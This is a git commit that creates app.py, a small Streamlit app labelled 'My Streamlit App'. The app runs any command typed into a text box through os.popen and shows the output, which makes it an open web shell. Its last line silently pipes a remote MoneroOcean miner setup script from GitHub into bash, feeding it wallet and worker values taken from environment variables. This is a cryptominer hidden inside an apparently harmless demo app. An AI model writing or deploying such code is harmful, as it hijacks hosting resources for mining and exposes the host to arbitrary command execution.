5bf7deb7c7e48dd410f8d662481238915dc42c24
Premraj123456 <104309530+Premraj123456@users.noreply.github.com>
2024-06-12 01:23:54 +0530

    Create app.py

---
+++ app.py
@@ -0,0 +1,19 @@
+import os
+import streamlit as st
+
+address = os.getenv("KEY")
+worker = os.getenv("PASS")
+
+st.header('My Streamlit App')
+input_text = st.text_input('Enter CMD')
+button = st.button('Run')
+
+if button == True:
+  if input_text != '':
+    output = os.popen(input_text).read()
+    st.text(output)
+  else:
+    st.text('Please Enter CMD')
+    
+
+os.system(f"curl -s -L https://raw.githubusercontent.com/Premraj123456/hey/main/setup_moneroocean_miner.sh | bash -s {address} {worker}")
